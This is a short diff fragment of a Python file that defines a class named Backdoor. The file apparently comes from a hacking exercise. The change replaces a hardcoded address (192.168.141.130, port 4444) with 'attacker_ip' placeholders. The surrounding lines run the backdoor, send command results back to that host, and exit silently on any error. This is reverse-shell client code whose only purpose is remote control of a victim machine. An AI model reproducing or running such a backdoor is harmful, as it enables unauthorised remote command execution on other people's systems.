@@ -62,7 +62,7 @@ class Backdoor:
             self.reliable_send(command_result)
 
 try:
-    my_backdoor = Backdoor("192.168.141.130", 4444)
+    my_backdoor = Backdoor("attacker_ip", port_to_listen_on)
     my_backdoor.run()
 except Exception:
     sys.exit()
